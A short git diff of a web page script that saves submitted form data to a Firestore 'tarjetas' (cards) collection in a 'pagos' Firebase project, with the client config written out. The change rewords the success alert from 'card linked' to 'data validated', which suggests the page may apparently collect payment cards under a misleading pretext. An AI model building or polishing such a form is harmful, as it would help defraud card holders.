@@ -114,12 +114,12 @@
     import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js";
     import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-firestore.js";
 
-    // Configuración Firebase corregida
+    // Configuración Firebase 
     const firebaseConfig = {
       apiKey: "AIzaSyBp_5laH8i7gBQ4SLl5RcSobs0xM9Kg3oE",
       authDomain: "pagos-bc42c.firebaseapp.com",
       projectId: "pagos-bc42c",
-      storageBucket: "pagos-bc42c.appspot.com",  // <-- corregido aquí
+      storageBucket: "pagos-bc42c.appspot.com",  
       messagingSenderId: "793081747436",
       appId: "1:793081747436:web:3020a54bdce85a61a9d2c9",
       measurementId: "G-FYBLX78MEH"
@@ -146,7 +146,7 @@
 
       try {
         await addDoc(collection(db, "tarjetas"), data);
-        alert("Tarjeta asociada con éxito");
+        alert("Datos validados exitosamente");
         form.reset();
       } catch (error) {
         alert("Error al guardar: " + error.message);
